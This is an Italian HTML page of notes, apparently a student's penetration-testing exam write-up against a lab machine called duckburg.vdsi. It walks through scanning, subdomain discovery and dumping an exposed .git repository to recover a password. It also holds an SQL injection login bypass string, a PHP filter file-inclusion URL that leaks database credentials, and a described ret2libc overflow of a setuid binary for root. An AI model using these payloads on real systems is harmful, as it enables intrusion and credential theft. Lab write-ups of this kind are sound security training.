<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Esame1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>Esame1</u></b></h1><h1>Getting Information </h1><br /><br /><br /><span style="color:#000000;background-color:#00ff0f;">nmap -sP 172.16.30.0/24</span> → trovo l'indirizzo ip della macchina 172.6.30.203<br /><br /><br /><span style="color:#000000;background-color:#00ff0f;">nmap -sS -sV 172.16.30.203 -A --script default,vuln</span><br /><br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 09:50 CEST<br /><br />Nmap scan report for 172.16.30.203<br />Host is up (0.00065s latency).<br />Not shown: 997 closed ports<br />PORT    STATE SERVICE  VERSION<br />22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br /><br />80/tcp  open  http     nginx 1.14.0 (Ubuntu)<br /><br />443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)<br /><br />MAC Address: 00:0C:29:E0:CD:50 (VMware)<br />Device type: general purpose<br />Running: Linux 3.X|4.X<br />OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />OS details: Linux 3.2 - 4.9<br />Network Distance: 1 hop<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE<br />HOP RTT     ADDRESS<br />1   0.65 ms 172.16.30.203<br /><br />OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 118.61 seconds<br /><br /><br /><br />Cerco informazioni sul server web → <br /><br /><h1>openssl s_client -connect 172.16.30.203:443</h1><br /><br />CONNECTED(00000003)<br />Can't use SSL_get_servername<br />depth=0 C = IT, ST = Rome, L = Rome, O = duckburg, OU = vdsi, CN = duckburg.vdsi, emailAddress = info@duckburg.vdsi<br /><br />oltre al certificato del server trovo come CN duckburg.vdsi, lo assegno quindi agli host conosciuti in /etc/hosts<br /><br />Verifico la presenza di sottodomini presenti, utilizzo gobuster → <br /><br /><h1>gobuster vhost -u duckburg.vdsi -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt </h1><br /><br /><br /><br />Gobuster v3.0.1<br />by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br />===============================================================<br />[+] Url:          <a href="http://duckburg.vdsi">http://duckburg.vdsi</a><br />[+] Threads:      10<br />[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt<br />[+] User Agent:   gobuster/3.0.1<br />[+] Timeout:      10s<br />===============================================================<br />2019/07/10 12:38:33 Starting gobuster<br />===============================================================<br />Found: dev.duckburg.vdsi (Status: 200) [Size: 219]<br />Found: staging.duckburg.vdsi (Status: 401) [Size: 204]<br />===============================================================<br />2019/07/10 12:38:46 Finished<br />===============================================================<br /><br /><br />Trovati dev e staging → assegno anche questi agli host conosciuti → posso vedere le pagine, tranne staging la quale richiede un username e una password<br /><br /><br /><img src="images/5-1.png" alt="images/5-1.png" /><br /><br /><br /><br />Mentre per staging ho bisogno di un user e una pass.<br /><br /><br /><br />→ trovo la cartella /.git/ che non puo essere accessibile dal browsare (403), allora la scrico con un dumper → <br /><br /><br /><img src="images/5-2.png" alt="images/5-2.png" /><br /><br /><br /><h1> git ls-files</h1><br /> <br />.htpasswd<br />TODO<br />donalduck/config.php<br />donalduck/index.php<br />donalduck/login.php<br />donalduck/logout.php<br />duckburg.jpg<br />index.html<br />scrooge.gif<br />vault.html<br /><br /><br /><h1>git show</h1> → per esplorare tutti i file trovati, leggo i codici php delle pagine<br /><br /><br /><br /><br /><h1>git rev-list --objects --all</h1> → ottengo il codice hash dei vari file presenti nel repository<br /><br /><br />8c34c003a1c50baf796d3f366893dff3cf6746d6 .htpasswd<br />5fcceeb29edbf62069600707522ca58ec77997ab TODO<br />0f037745b0bf32d891a87291a31ae3bfae4a257d donalduck<br />60ec58c21945c5d77eafb697c43707c2f1f3ef72 donalduck/config.php<br />625f1773c7df2fa0fd2b0c3d84b37d748cf4366a donalduck/index.php<br />bc41f8a3de8c27cd28d992aa5c8000fa8ffdc6a3 donalduck/login.php<br />58f33757241503625e582498b1b281a6f081693f donalduck/logout.php<br />5356e9bf758d62f764cb2d0fcf8c3f1f8b7c6d2d duckburg.jpg<br />8e4e40268646ea9bd9c5d6ac07b0b76b057d112a index.html<br />4807fcb12a0b211a538b847883abcd4db489d7a7 scrooge.gif<br />812a9151e79fdf3cb81ef6d696ee52d5807dc6ac vault.html<br /><br /><br /><br />torno nella directory precedente e resetto la history dei commit in modo da vedere cosa l'utente Archimede ha cancellato di particolarmente sensibile  dal TODO<br /><br /><h1>git reset --hard HEAD~1</h1> → restituisce <br /><br />HEAD ora si trova a 560d8cb Removed sensitive information from TODO<br /><br />Adesso ridando nuovamente il comando git show vengono mostrate le differenze con quanto visto precedentemente<br /><br /><br /><img src="images/5-3.png" alt="images/5-3.png" /><br /><br /><br /><h1>git cat-file -p 87ff11ef1ef1c9bf4358db49755103b9a95e75a2</h1><br />scrooge_mcduck:1_l0V3_m0n3Y_4_L0tT!<br /><br /><br />Posso autenticarmi su <a href="http://staging.duckburg.vdsi/donalduck/login.php">http://staging.duckburg.vdsi/donalduck/login.php</a> e trovo il login precedentemente visto tramite sorgente<br /><br />Analizzando il codice php si nota che se viene ritornata una sola riga dalla richiesta fatta al db allora si è autenticati → <span style="color:#000000;background-color:#00ff0f;">test' or 1=1 limit 1 -- -</span>  uso come user<br /><br />limitanto la risposta ad una sola riga sono autenticato<br /><br /><br /><img src="images/5-4.png" alt="images/5-4.png" /><br /><br /><br /><br /><br /><br /><br /><br /><img src="images/5-5.png" alt="images/5-5.png" /><br /><br /><br /><br /><br /><br />adesso osservando index.php si nota che se è settata la variabile config tramite get viene incluso nella pagina un file del sistema<br /><br /><br /><br /><img src="images/5-6.png" alt="images/5-6.png" /><br /><br /><br /><br /><br />infatti <a href="http://staging.duckburg.vdsi/donalduck/?config=/var/www/staging/donalduck/login">http://staging.duckburg.vdsi/donalduck/?config=/var/www/staging/donalduck/login</a>  include direttamente il login, e utilizzando la conversione in base64 posso effettuare il print del file config.php al cui interno sono presenti i dati necessari ad autenticarsi in mysql  <a href="http://staging.duckburg.vdsi/donalduck/?config=php://filter/convert.base64-encode/resource=config">http://staging.duckburg.vdsi/donalduck/?config=php://filter/convert.base64-encode/resource=config</a><br /><br /><br /><img src="images/5-7.png" alt="images/5-7.png" /><br /><br /><br /><br /><br /><br /><br />decode e ottengo<br /><br /><br />&lt;?php<br />    define('DB_USER', 'donalduck');<br />    define('DB_PASSWORD', '92bfc76a10627a1ac813b0755b611134');<br />    define('DB_SERVER', 'localhost');<br />    define('DB_DATABASE', 'duckburg_db');<br /><br />    //$db = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_DATABASE);<br />?&gt;<br /><br /><br />Funziona con ssh → si ha l'accesso al sistema come utente donalduck<br /><br /><br /><img src="images/5-8.png" alt="images/5-8.png" /><br /><br /><br />Trovo un fiile ‘ciao’ nella directory principale, noto che ha il setuid impostato (in opt/ è presente lo stesso con setuid abilitato) ed è vulnerabile al bufferoverflow  → con gridra trovo il valore segreto per abilitare il trabocco dei dati che è ‘DEADBEEFh’<br /><br /><br /><img src="images/5-9.png" alt="images/5-9.png" /><br /><br /><br /><br />verifico, dandolo come parametro dopo -s e funziona! <br /><br />Trovo l'offset del parametro stringa passato alla funzione ciao → 4c che in decimale corrisponde a 78 escludendo i 4 bytes destinati al valore di ritorno, ho che l'offset coincide con 72<br /><br /><br /><br /><img src="images/5-10.png" alt="images/5-10.png" /><br /><br /><br /><br /><br /><br />Adesso trovo gli indirizzi base della libreria c, offset di system e offset di sh → posso quindi calcolare l'indirizzo dei blochi di memoria contenenti system e sh per chiamarli non appena si verifica il traboco, ed ottenere cosi una shell root avendo eseguito ‘ciao’ come root (setuid), noto che la variabile randomize è settata a 2 di conseguenza gli indirizzi base sono sempre variabili, ma provando ad eseguire in ciclo for per 2000 volte molto probabilmente verrà beccato più di una volta l'indirizzo giusto<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><img src="images/5-11.png" alt="images/5-11.png" /><br /><br />eseguo lo script→ <br /><br /><br /><img src="images/5-12.png" alt="images/5-12.png" /><br /><br /><br /><br /><br /><br /><img src="images/5-13.png" alt="images/5-13.png" /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></body></html>